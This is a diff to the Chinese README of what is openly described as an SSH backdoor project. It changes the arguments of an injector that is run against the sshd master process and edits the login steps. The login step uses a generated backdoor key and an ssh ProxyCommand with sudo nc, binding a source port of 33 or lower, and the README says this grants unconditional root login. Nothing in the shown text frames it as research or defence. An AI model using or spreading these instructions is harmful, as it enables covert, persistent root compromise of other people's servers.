@@ -38,20 +38,18 @@ make
 
 如果使用时 sshd 路径或相关依赖库路径不同，也可以在命令后跟参数指定：
 ```bash
-./build/injector <sshd-master-pid> [sshd-path libc-path libcrypto-path ld-path]
+./build/injector <sshd-master-pid> [sshd-path libc-path ]
 ```
 默认路径如下：
 - sshd: `/usr/bin/sshd`
 - libc: `/usr/lib/libc.so.6`
-- libcrypto: `/usr/lib/libcrypto.so.3`
-- ld: `/usr/lib/ld-linux-x86-64.so.2`
 
 ---
 
 ### 3. 后门 SSH 登录
 
 - 使用项目生成的 `./the_backdoor_key` 作为 SSH 私钥。
-- 以及**端口号需小于等于 33**，如：`ssh -i the_backdoor_key -o "ProxyCommand = sudo nc 127.0.0.1 22 -p 111" root@127.0.0.1`
+- 以及**端口号需小于等于 33**，如：`ssh -i the_backdoor_key -o "ProxyCommand = sudo nc 127.0.0.1 22 -p 20" root@127.0.0.1`
 - 即可无条件获得 root 登录权限。
 
 ---
